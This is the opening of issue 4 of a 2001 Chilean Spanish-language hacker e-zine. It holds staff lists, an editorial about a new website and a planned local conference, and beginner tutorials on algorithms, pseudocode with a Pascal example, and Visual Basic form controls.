/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /
\**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\
/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /
****              *  *                                   *  *                 ****
\* \              \  \            .$2*EST*z$.            \  \                 \ *\
/* /              /  /           x*#"~```"!Rn·$          /  /                 / */
\* \  ELECTRON    \  \          z!~           ~@!        \  \    ELECTRON     \ *\
/* /              /  /         xZ~             `Eo       /  /                 / */
\* \  SECURITY    \  \        $? ^%$%·ç·#~~·^]ç*`$       \  \    SECURITY     \ *\
/* /              /  /        $EL"··$·$%2~$~€P*:$¸      /  /                 / */
\* \    TEAM      \  \        ?B                         \  \      TEAM       \ *\
/* /              /  /         `?2L                      /  /                 / */
\* \              \  \          `#$m.......u@#~          \  \                 \ *\
/* /              /  /             ~2#tW2W$*"`           /  /                 / */
****              *  *                                   *  *                 ****
/**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/
\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \
/                                                                                /
|     Revista Electronica Chilena de Informatica. Numero #04, 18/12/2001         |
\                                                                                \
/**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/  /**/
\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \**\  \


                                    Disclaimer.

La informacion  publicada en  Electron  Security Team tiene como unico fin educar, 
ense~ar y dar orientacion a sus lectores. Cualquier  da~o  o destruccion efectuado 
con  dicha  informacion es  responsabilidad  unica y exclusiva del  lector. No nos 
responsabilisamos de lo que nuestros lectores puedan pensar o hacer. 
Todos los  comentarios emitidos  en Electron Security Team son de  responsabilidad 
unica y exclusiva del nick que lo firme y  no  tienen porque  representar  lo  que
piensa esta e-zine. Los caracteres raros y acentos han sido eliminados para evitar 
cualquier tipo de problema con los editores de texto.




 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 [-/-                                                                         -\-]
 [-/-                      -<[( Staff Oficial )]>-                            -\-]
 [-/-                                                                         -\-]
 [-/-        E                                                       E        -\-]
 [-/-        L    (=[  EleKtr0    =[ EST ]=   elektr0@est.cl  ]=)    L        -\-]
 [-/-        E    (=[  z0rbas     =[ EST ]=    z0rbas@est.cl  ]=)    E        -\-]
 [-/-        C    (=[  meth0dist  =[ EST ]= meth0dist@est.cl  ]=)    C        -\-]
 [-/-        T                                                       T        -\-]
 [-/-        R                                                       R        -\-]
 [-/-        O    (=[  Gin_sUk    =[ EST ]=   gin_suk@est.cl  ]=)    O        -\-]
 [-/-        N    (=[  bankzide   =[ EST ]=  bankzide@est.cl  ]=)    N        -\-]
 [-/-                                                                         -\-]
 [-/-                           SECURITY TEAM                                 -\-]
 [-/-                                                                         -\-]
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`  
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 [-/-                                                                         -\-]
 [-/-                   -<[(   Colaboraciones   )]>-                          -\-]
 [-/-                                                                         -\-]
 [-/-        Shisei Brujo         =[ EST ]=  shisei_brujo@latinmail.com       -\-]
 [-/-        filth                =[ EST ]=  filth@sunos.com                  -\-]
 [-/-        Kpanic               =[ EST ]=  kpanic@mail.com                  -\-]
 [-/-        Reox                 =[ EST ]=  maray@inf.utfsm.cl               -\-]
 [-/-        _5010_               =[ EST ]=  s010_@hotmail.com                -\-]
 [-/-        Toleran-C            =[ EST ]=  Toleran-C@hackers.linuxplanet.nu -\-]
 [-/-        Silen-C              =[ EST ]=  Toleran-C@hackers.linuxplanet.nu -\-]
 [-/-        carcoco              =[ EST ]=  carcoco@grupobbva.net            -\-]
 [-/-                                                                         -\-]
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`  
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 [-/-                                                                         -\-]
 [-/-                 -<[(  Informaciones y extras  )]>-                      -\-]
 [-/-                                                                         -\-]
 [-/-            Email Oficial = est@est.cl                                   -\-]
 [-/-        E   Sitio Oficial = www.est.cl                         E         -\-]
 [-/-        L   Canal Oficial = #electron / irc.terra.cl / 7000    L         -\-]
 [-/-        E                                                      E         -\-]
 [-/-        C   Editores      = meth0dist, EleKtr0                 C         -\-]
 [-/-        T   Electrones    = z0rbas, bankzide, Gin_sUk          T         -\-]
 [-/-        R   Electrones    = meth0dist, EleKtr0                 R         -\-]
 [-/-        O   Colaboradores = Shishei Brujo, filth, Kpanic       O         -\-]
 [-/-        N   Colaboradores = Reox, Toleran-C, Silen-C           N         -\-]
 [-/-            Colaboradores = _5010_, carcoco                              -\-]
 [-/-                                                                         -\-]
 [-/-                                                                         -\-]
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`     
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 [-/-                                                                         -\-]
 [-/-                         -<[( Saludos )]>-                               -\-]
 [-/-                                                                         -\-]
 [-/-            (=[    CDLR           =  www.cdlr.org        ]=)             -\-]
 [-/-            (=[    Systat         =  www.systat.cl       ]=)             -\-]
 [-/-            (=[    0wn3d          =  www.0wn3d.f2s.com   ]=)             -\-]
 [-/-            (=[    0ri0n          =  www.0ri0n.org       ]=)             -\-]
 [-/-            (=[    SET            =  www.set-ezine.org   ]=)             -\-]
 [-/-            (=[    Ezkracho TEAM  =  www.ezkracho.com.ar ]=)             -\-]
 [-/-            (=[    Net-X Team     =  www.net-x.f2s.com   ]=)             -\-]
 [-/-                                                                         -\-]
 [-/-                                                                         -\-]
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`    
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 [-/-                                                                         -\-]
 [-/-                    -<[( Downloads/Mirrors )]>-                          -\-]
 [-/-                                                                         -\-]
 [-/-           (=[   Zine Store     =  www.zine-store.com.ar  ]=)            -\-]
 [-/-           (=[   Van Hackez     =  www.vanhackez.com      ]=)            -\-]
 [-/-           (=[   0ri0n          =  www.0ri0n.org          ]=)            -\-]
 [-/-                                                                         -\-]
 [-/-                                                                         -\-]
 [-/-=============E L E C T R O N=====S E C U R I T Y=====T E A M=============-\-]
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`
 ¤°°`°¤ø¸¸,ø¤°`´°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°`°¤ø¸¸,ø¤°``°¤ø¸,ø¤ø¸¸,ø¤°`       


-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[ Indice ]=[ E-zine - N° 4 ]=========================================[ EST       ]
[ Numero ]=[ Articulo ]==============================================[ Autor     ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[ ( 01 ) ]=[ Editorial...............................................[ Editor    ]
[ ( 02 ) ]=[ Algoritmos y Pseudolenguaje.............................[ Reox      ]
[ ( 03 ) ]=[ Introduccion y Programacion en Visual Basic II..........[ meth0dist ]
[ ( 04 ) ]=[ Herramientas Para el H4cQ...............................[ Shisei B. ]
[ ( 05 ) ]=[ Construyendo un Cliente FTP en Visual Basic.............[ bankzide  ]
[ ( 06 ) ]=[ Introduccion a la Programacion..........................[ Reox      ]
[ ( 07 ) ]=[ Intromision en Linux....................................[ EleKtr0   ]
[ ( 08 ) ]=[ Sistemas de Deteccion de Intrusos N.I.D.S...............[ filth     ]
[ ( 09 ) ]=[ Una Mirada a La Seguridad...............................[ bankzide  ]
[ ( 10 ) ]=[ Empresas de Seguridad...................................[ _5010_    ]
[ ( 11 ) ]=[ Introduccion a los sniffer's y anti-sniffers............[ carcoco   ]
[ ( 12 ) ]=[ Configuracion Segura y Optima de la red Adsl/Atm........[ Toleran-C ]
[ ( 13 ) ]=[ Numeros Binarios........................................[ meth0dist ]
[ ( 14 ) ]=[ Compresion de Datos.....................................[ Shisei B. ]
[ ( 15 ) ]=[ Manejo Basico de Pgp Desde la Bash......................[ EleKtr0   ]
[ ( 16 ) ]=[ Crackeelo Ud. Mismo.....................................[ meth0dist ]
[ ( 17 ) ]=[ Aplicaciones Utiles e Inutiles del Bash.................[ Reox      ]
[ ( 18 ) ]=[ Montandose a Linux con Samba............................[ Kpanic    ]
[ ( 19 ) ]=[ Avisos Varios...........................................[ EST       ]
[ ( 20 ) ]=[ UnderNews...............................................[ EST       ]
[ ( 21 ) ]=[ Llaves PGP..............................................[ EST       ]
[ ( 22 ) ]=[ Despedida y Comentario Final............................[ EST       ]
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=



[====([ Editor ])==========================================================EST-4=]
[====([ Editorial ])=========================================================#01=]
[===============================================================([ est@est.cl ])=]


Padres y madres, lolos y lolas, abuelos y  abuelas, sean todos ustedes bienvenidos
a la cuarta entrega de la revista  electronica: Electron Security Team. Despues de
cerca de ocho meses hemos  regresado  y aunque esta edicion se nos  hizo dificil y 
larga, nos tomamos el tiempo para  poder sacarla adelante solo para ustedes. Desde 
la tercera edicion   hasta  ahora han  sucedido  muchisimas cosas aca en Chile, ya
sea por la  organizacion de la Hack It!, como tambien  porque  han  surgido varios
grupos nuevos. Me refiero  a  Systat  Seguridad  y  a  Net-x   a  los  cuales  les
espero que se mantegan vigentes aca en Chile  y  les  mandamos un saludo para  que
continuen trabajando y sigan adelante con sus proyectos.

Despues de todo, nos  costo bastante  sacar este numero. Hubo  un  momento  en que
pensamos en terminar  con la revista, pero  nos  dimos los animos para poder sacar
adelante esta cuarta entrega, con el  mejor material que pudimos crear y junto con 
algunas  colaboraciones. Como  han  podido apreciar, despues  de algunos problemas 
con www.electron-team.cl, ahora  tenemos dominio nuevo: www.est.cl. La pagina esta
dise~ada en php-nuke, siendo  uno  de  los  pocos  sitios que usan esa  tecnologia
aca en Chile. Nos  decidimos por Php-Nuke, ya que da un dise~o activo a  la pagina
y los usuarios  pueden  interactuar  mas  con ella, ya  sea  con  noticias, siendo 
miembros  o  participando  en  las  encuestas  etc. Como  tambien   habran  notado
el antiguo editor (EleKtr0), se anduvo dedicando al  estudio (asi se llama ahora),
y me ha tocado a mi (meth0dist), darles la  cara para recibirlos. En  esta edicion
tenemos de todo un poco: programacion, linux, seguridad etc. Todo el  material que
reunimos, tratamos de que fuera los mas entretenido e interesante posible, para el
deleite de todos ustedes.

En lo que  respecta a  los  integrantes de  Electron han  habido ciertos  cambios.
Tenemos un nuevo  integrante, conocido  como  Gin_sUk, al cual espero que siga con
nosotros por mucho tiempo. Tambien hemos sufrido  unos cambios por  la ida de Reox
y de Kraptor que no tienen  relevancia ya que seguimos  en contacto, pero  en fin,
donde sea que esten les deseamos lo mejor y mucha suerte,  recuerden  siempre  que 
fueron miembros de EST ahora lo importante es que estamos todos reunidos y  listos
para  seguir adelante con el grupo, la e-zine y la web que nos mueve a todos.

Con respecto a la Hack It!, este es un evento que  se va a realizar aca en Chile y
que va a tratar temas acerca de  tecnologias nuevas e informatica en  especial. Se
supone que se realizara en el  verano  del 2002, por lo  que  cada vez falta menos
tiempo. En nuestro  sitio, hemos  hecho foros  para la discusion de  este  evento, 
acerca de  como  debe  financiarse, y sobre que temas les  gustaria a la gente que
tratara. Tambien el dise~o  de el sitio oficial de la Hack It! se esta  haciendo y
tambien se puede  obtener  informacion  sobre  ella  en  sitios como www.cdlr.org,
www.0wn3d.f2s.com, www.350cc.com y el nuestro www.est.cl. Esperemos que todo salga
bien y podamos disfrutar de este gran evento en el verano que sera la  primera CON
de nuestro pais.

Por ultimo queria invitarlos  a colaborar mandando  noticias y articulos a nuestro
sitio web, al igual  que  para  la proxima  edicion  de  Electron  Security  Team.
Tambien me gustaria dar la gracias a todos los colaboradores de esta  edicion y en
especial a toda la gente que nos ha apoyado.

Esperamos  contar con  su  ayuda y  su  apoyo  para  seguir  adelante dia  a  dia. 
Cualquier duda o consulta:   est@est.cl  es nuestro mail o  a  los mail  de  cada
miembro.

Saludos
Electron Security Team


[=========================([ Electron Security Team ])===========================]



[====([ Reox ])============================================================EST-4=]
[====([ Algoritmos y Pseudolenguaje ])=======================================#02=]
[=======================================================([ maray@inf.utfsm.cl ])=]


A  ver, en  este  modesto texto  tratare  explicar  muy brevemente las bases de
la  programacion, orientada a  los  lenguajes  de alto nivel. Cuando  empeze  a
programar, como  a  los 8 o 9 a~os en el  basic del ATARI 65XE, instintivamente
comenze a  comprender la logica de la  programacion, pero  tuvieron  que  pasar
muchos a~os para que pudiera entender como funcionan  realmente estos  ciclos y
sentencias, que con un poco  de ayuda son  bastante simples de vislumbrar. Esta
vez escribire de los  algoritmos y del  pseudolenguaje, en alguna  otra ocacion 
escribire de un lenguaje en particular.

I-. LOS ALGORITMOS

(1)  Introduccion:

La palabra algoritmo  viene de la  deformacion las  palabras AL-KHOWARIZM, pero 
creo que a nadie le interesa, asi que  vamos directo al grano. Algoritmo  es un 
conjunto ordenado de reglas bien definidas para la solucion  de problema en una
cantidad finita  de  pasos, y sirve  para  establecer secuencias  aplicables  a 
cualquier  lenguaje  o   datos. Al  final  de  cuentas  es  una  securencia  de 
intrucciones, asi como una formula para lograr un objetivo.  Ej:

	Algoritmo para hacer una "Sopa para Uno"
	
	Paso 1º : Saque una taza y una "sopa para uno" (Obvio)
	Paso 2º : Saque la tetera (Bueno si te incorporaste al presente 
                  tendras microondas)
	Paso 3º : Llene la tetera con 350cc (Ejem... eso me suena a fye)
                  de agua
	Paso 4º : Prenda el quemador (ALERTA: por favor hagalo con la
                  supervicion de un adulto )
	Paso 5º : Hierva el agua ( hasta que llegue a los 100º C)
	Paso 6º : Vierta el contenido del sobre dentro de la taza 
                  (a gusto)
	Paso 7º : Vierta el agua hirviendo dentro de la taza
                  (sin quemarse!!!!)
	Paso 8º : Deje enfriar unos minutos (si no hace este paso va a
                  ocurrir un error extendido)
 
En  este  ejemplo  tenemos  ciertos  pasos, pero no  todos, ya que el  resto se 
asumen, por ejemplo abrir el sobre o limpiar la taza. El algoritmo es aplicable 
pa cualquier tipo  de  casa, version  de  Taza, he  incluso es  adaptable  para 
microondas. Un algoritmo informatizado, se puede aplicar a  cualquier lenguaje, 
y por ende a cualquier  sistema. Es solo una representacion de como tienen  que
realizarse las cosas para que funken. Es por eso que se pueden saltarse ciertos
pasos que el programador tendra que realizar en su programa.

(2)  Las principales caracteristicas de un Algoritmo

(a) La Efectividad:  El  algoritmo  siempre  entregara el resultado  deseado y 
    definitivo
(b) La Finitud : El algoritmo siempre tendra un comienzo y un fin 
(c) La Generalidad: El algoritmo siempre tendra la generalidad nescesaria para 
    ser utilizado en diferentes variaciones del problema

Con el  ejemplo  anterior  podemos  explicar  estas  caracteristicas. Si  haces 
los pasos correctamente vas a tener una sopa para uno rica y  deliciosa, por lo 
tanto es efectivo. El algoritmo  comienza sacando  una taza, y termina  dejando 
enfriar la sopa unos minutos, por lo que tiene 8 pasos, esto es  finitud. Y por
ultimo, este  algoritmo  sirve  para  cualquier  tipo  de taza, para  cualquier 
tetera, y para cualquier sopa para uno, por lo tanto es general.

(3) Ejemplos.

* Los algoritmos, generalmente  representados  por  diagramas de flujo, los mas 
  simples son los los bidecisionales, es decir de verdadero  o  falso, si o no,
  negro o blanco, etc.

EJ.1

1) Comienzo 
2) Hay semaforo? (si = 3; no = 6) 
3) Mirar semaforo 
4) Esta rojo? (si = 5; no =9 )
5) Esperar (volver a 4)
6) Mirar izquierda y derecha 
7) Viene algun auto? (si = 8; no = 9)
8) Esperar (volver a 7)
9) Cruzar


* El ciclo "mientras" tambien  es  muy  importante, y  de este  se desprende el
  famoso ciclo "FOR". Este consiste en repetir  una misma sentencia  hasta  que
  cambie la condicion de inicio.

EJ.2

1) Comienzo 
2) El dia esta soleado o nublado? 
3) Mientras: el dia este soleado
(verdadero = 4 ; Falso = 9) 
4) Ir a la playa 
5) Salir a caminar 
6) Volver a dormir 
7) Daspertarse 
8) Mirar por la ventana (volver a 3) 
9) Preparar sopaipillas

* Deduccion del proceso FOR (bucle)

Este  proceso  consiste en  repetir un proceso  N  veces, es  decir  una  cifra
determinada y ajena a cambios externos.

1) Comienzo 
2) Definicion variable X 
3) Definicion de la constante N 
4) Mientras: AUX distinto de N (verdadero = 5; falso = 8) 
5) Proceso a realizar 
6) X = X (sentido (+ o -) y salto) 
7) Volver a 3 
8) Fin

La sintaxis del proceso FOR, Incluye un valor de la constante N, un primer
valor para X (X1), el sentido y el salto

FOR X : 1 TO 10: step = 2
        | | | |
       X1 | N salto
         Direccion (+)

1) Comienzo 
2) N = 10 
3) X = 1 
4) Mientras: AUX distinto de N (verdadero = 5; falso = 8) 
5) Proceso a realizar 
6) X = X + 2 
7) Volver a 3 
8) Fin

* Por ultimo, el otro algoritmo fundamental de conocer es el
Multidecisional, 
EJ3:
1) Comienzo 
2) Que se desea tomar? 
3) Comienzo de los casos 
4) En el caso de "piscola": consecuencia "Hachazo"
5) En el caso de "cerveza": consecuencia "Enguatao"
6) En el caso de "chicha" : consecuencia "Witre" 
7) En el caso de "Wisky"  : consecuencia "pato" 
8) Fin de los casos
9) FIN


(4) En conclusion....
Podemos   decir   que   estos   tres   ciclos   algoritmicos, representados por 
las  sentencias "si o  no", "mientras" y "en el  caso de",  son la base  de los 
lenguajes de programacion de alto nivel, como pascal, C o basic, ya que gracias 
a estos se realizan  la  estructura y  logica de un  programa, y por  ende toda 
secuencia de instrucciones. Es importante saber  no solo para que  sirven, sino
que como funcionan, ya  que constituyen  parte fundamental de la  logica  de un 
programador y en consecuencia el optimo uso de estos. Siempre hay  que tener en 
cuenta  que   el  lenguaje  maquina, y  los  ensambladores  no  incluyen  estas 
sentencias de la  forma representada en los lenguajes de alto nivel  por lo que 
es otra razon para conocer su funcionamiento y forma.


II-. EL PSEUDOLENGUAJE

Este  amiguito  es  una  de  las   herramientas  mas utiles  de un programador, 
y mas aun si no es gringo. Consiste  en realizar un  posible codigo de programa 
en un  lenguaje  nativo, de  facil  entendimiento y  de  rapido  desarrollo que 
permite vislumbrar posibles errores, conflictos o complicaciones de la solucion
programada  de   un  algoritmo. Permite  ademas  la  claridad  de  la  solucion 
programada y minimizar los errores del codigo. Podriamos  comparar la  tarea de 
un programador con la de un arquitecto: Dise~a un plano, desarrolla una maqueta 
y construlle. El programador realiza un algoritmo o  diagrama de flujo, realiza
el codigo en pseudolenguaje y por ultimo  trabaja en el lenguaje.  Las ventajas
de este Pseudolenguaje van a tal punto que es ideal para trabajos  en  grupo, o
proyectos compartidos, ya que aunque  todos conozcan Lenguajes diferentes,todos 
entenderan el pseudo(asi  le  digo  por  cari~o)  y podran  trabajar  luego  de 
planificado el codigo en sus respectivos lenguajes. A continuacion  mostrare un
simple programa en pascal y luego el pseudo del mismo codigo.

-------------PASCAL-------------- 
Program Ejemplo4;

Var
 Edad: integer;
 Nombre: string;

Begin
 Write('Cual es su nombre');
 Read(Nombre);
 Write('Cual es su edad');
 Read(Edad);
 If edad < 18 then
   Begin
     Write('lo siento ',Nombre,', eres muy joven para entrar');
   End
 Else
   Begin
    Write('Ok ',Nombre,', tienes la edad adecuada');
   End;
End.

-----------FIN PASCAL------------

Este  programa solo preguntara nombre, edad  y  te dira si eres  mayor  de edad
si o  no, ahora  miren  como cambia  la comprension dl lector del  programa con
el Psudo.

--------------PSEUDO------------

Nombre Del Programa = Ejemplo1;

Definicion de variables:
'Edad' es de tipo ENTERO 
'Nombre" es de tipo TEXTO

Comienzo del Programa

Escribir "Cual es su nombre" Leer en 'Nombre' 
Escribir "Cual es su edad"
Leer en 'edad'
 Si 'edad' es < 18 entonces
   Comienzo del ciclo 'Si'
    Escribir "lo siento (Nombre) eres muy joven para entrar"
   Fin del ciclo 'Si'
 En otro caso
   Comienzo del ciclo 'en otro caso'
    Escribir "Ok (Nombre), tienes la edad adecuada"
   Fin del ciclo 'en otro caso'
Fin del programa

---------------FIN PSEUDO---------------

Cabe destacar que Pascal, es el lenguaje mas  parecido al Pseudo, ya  que todas 
sus instrucciones estan en ingles y claramente expuestas, no asi  con  Fortran, 
Cobol, o C, los cuales traen muchas  abreviaciones  y  siglas, que  simplifican 
el trabajo del experto, pero  lentifican el aprendizaje logico  de los newbies.

En el  pseudolenguaje los  ciclos  basicos de  representan  comunmente  por una
palabra en el idioma utilizado, por ejemplo el "si y  no" de los algoritmos, en 
pseudo se denomina "si"  o "if"; el "mientras" de  los algoritmos es  aplicable 
perfectamente y se denomina igualemente, o con si  variante  gringa "while"; el 
ciclo FOR, se denomina "para" o en  gringolandia FOR tb. El "en  caso de" o "in
case  of"  cambia  rotundamente  en cada  lenguaje  por  lo  que no es de mucha 
importancia declarar en el pseudo una sentencia definida que pueda  confundir a
otros programadores.

III-. SOBRE PROGAMAR

Si nunca has programado, es muy importante que antes de  conocer la sintaxis de
un lenguaje te informes de los conceptos claves y los  domines a la perfeccion.
Tienes que aprender de conceptos de variables, pantalla, un poco de  Operadores 
Logicos y por que no estructura de datos, archivos y ficheros. A pesar de todo, 
el programar es un arte, la logica  no siempre se  aprende sino  que a veces se 
nace con ella. Los grandes genios  no  se hacen, sino  que  nacen, por lo que a 
veces el mas inculto ni~o que  programa en Basic, sea  mas logico y  mas genial
que el mas grande  programador de  NASA. A veces uno  esta  inspirado, y  otras 
veces confuso y agobiado, es  por eso  que personalmente  me tomo el  programar 
como un arte, es decir hacerlo con cari~o  aunque  parezca  ridiculo, intentelo
les hara mas apacible el trabajo

Bueno me fui en la vola en el ultimo parrafo pero de eso se trata estos ezines,
no solo aspectos tecnicos, sino me compraria un libro :) ...Bueno me despido..
a ver si me mandan  algun  E-milio (shhhiiaaaa) pa  que me  den ideas  de  que
escribir.


[=========================([ Electron Security Team ])===========================]




[====([ meth0dist ])=======================================================EST-4=]
[====([ Introduccion y Programacion en Visual Basic II ])====================#03=]
[=========================================================([ meth0dist@est.cl ])=]


Hola a todos. Aca estoy, esta vez con la continuacion  del curso  de  Visual Basic
que el bankzide habia comenzado en EST 2. Vamos a comenzar repasando un poco lo ke
vimos anteriormente y luego vamos a ver unas cosillas nuevas, como agregar musica,
imagenes, controles, la hora etc. No les sigo  dando la lata, asi que vamos a  ver
de que se trata todo esto.  
Este articulo lo voy a dividir en tres partes, asi que vamos con la primera parte.

1. Uso de botones, msgboxs y otros.

Partamos  con   el  uso   de   los   botones,  msgboxs,  textboxs   e  inputboxes.
Primero ejecuta el visual basic  y pon crear  un nuevo "Exe Standar". Vas a ver el
"form" en el que comenzaras trabajando. Crea  un boton (la barra a  mano izquierda
tiene los botones, textbox, msgbox etc.). Ahora hazle doble click e inmediatamente
ingresaras al codigo de este. Veamos:

Private Sub Command1_Click()  
 
End Sub

Como se ha podido apreciar, el codigo  del programa se escribe  entre "Private Sub
Command1_Click()" y "End Sub". "Command1_Click" es el nombre del boton, al cual le
puedes cambiar el nombre. Si queremos que cuando se  le  haga click  al boton, nos 
salga un msgbox diciendo "Hola", entonces el codigo deberia ser como el siguiente.

Private Sub Command1_Click()
MsgBox "Hola"
End Sub

Ahora ejecuta el programa y  haz click en  el boton, obteniendo como  resultado un 
msgbox diciendote "Hola". Recuerda que lo que quieras que salga, debe  estar entre
comillas. Ahora, si  quieres que  el msgbox salga con un beep  o con  un  signo de
informacion se pone lo siguiente en el codigo del boton.

Private Sub Command1_Click()
MsgBox "Hola", vbInformation
End Sub

Al hacer click en el boton una vez ejecutado el programa te saldra con un "beep" y 
con un icono de exclamacion.

Ahora vamos con algo un pokito mas avanzado que lo anterior. Creemos un textbox en
el form quese  llamara  "Text1". En las  propiedades  del  text1 (a mano derecha), 
ponle  nada  en  el text o haz  doble  click  en el form y  escribe lo  siguiente:

Private Sub Form_Load()
Text1.Text = ""
End Sub

Ahora en el codigo del boton escribamos lo siguiente:

Private Sub Command1_Click()
Dim a As String
a = Text1.Text
MsgBox a
End Sub

Ahora dale, y al escribir algo en el  textbox y apretar el  boton te saldra lo que
escribiste en el textbox. Inutil, pero sirve de ejemplo. Repasemos el  codigo. Los
comentarios van entre despues del '.

Private Sub Command1_Click()
Dim a As String 'Definimos la variable "a" como string
a = Text1.Text  'Ponemos que lo que esta escrito en el textbox sea igual a "a"
MsgBox a, vbInformation 'El messagebox nos muestra lo k vale a con un beep
End Sub         'termino

Con respecto al "Private Sub Form_Load()", este  hace  lo que uno  le  indique  al 
cargarse el programa.
Veamos los inputbox ahora. En un nuevo proyecto crea un boton, y un textbox. Ahora 
haz doble click en el boton, borra lo que sale y escribe lo siguiente:

Private Sub Command1_Click()
Dim a As Variant
a = InputBox("Ingresa tu nombre")
Text1.Text = a
End Sub

Private Sub Form_Load()
Text1.Text = ""
End Sub

Como podemos notar definimos "a" como variante y  como un inputbox (y lo que sea).
Al correr el programa, el inputbox te pregunta por algo y al escribir y  darle ok, 
te muestra en el textbox que  hicimos lo que escribiste. Simple no?. Utilizamos el 
Private Sub Form_Load() para que  apenas se cargara el programa, dejara en  blanco 
al text1.

Ocupemos ahora los "combobox", los cuales nos sirven para elegir alguna opcion de 
las que le pongamos. En un form nuevo, crea un boton y un combobox.
En el codigo del boton escribe lo siguiente:

Private Sub Command1_Click()
If Combo1.Text = "" Then
MsgBox "escoga alguna opcion"
End If
If Combo1.Text = "Irc" Then
MsgBox "irc"
End If
If Combo1.Text = "ftp" Then
MsgBox "ftp"
End If
If Combo1.Text = "mail" Then
MsgBox "mail"
End If
If Combo1.Text = "http" Then
MsgBox "http"
End If


En el codigo de inicio "sub form load" escribe lo siguiente:

Private Sub Form_Load()
Combo1.AddItem "Irc"
Combo1.AddItem "ftp"
Combo1.AddItem "mail"
Combo1.AddItem "http"
End Sub


Lo que hace este programa, es que cuando tu  elijes  alguna opcion del combobox, ya
sea irc, y apretas el boton, te  sale  un  msgbox  diciendo "irc". Lo mismo  sucede
con http, mail etc. Como haz notado para agregar items  al  combobox  se escribe lo
siguiente: combo1.additem "hola"
Siendo "combo1" el nombre del combobox y "hola" lo que se desea agregar. Tambien se
pueden quitar elementos del "combobox" de la siguiente manera: 
Combo1.RemoveItem "hola"
Asi de simple es y muy util son los combobox.


2. Escuchando sonidos.

Veamos como podemos hacer para oir sonidos .wav o mid. Para poder oirlos tendremos
que agregar un control de sonido que se llama "mmcontrol". Para hacerlo tienes que
hacer lo siguiente: anda en el menu a  proyecto y luego a componentes. En el  menu
controles  hazle un  click al Microsoft Multimedia  Control 6.0 y luego  aplicalo. 
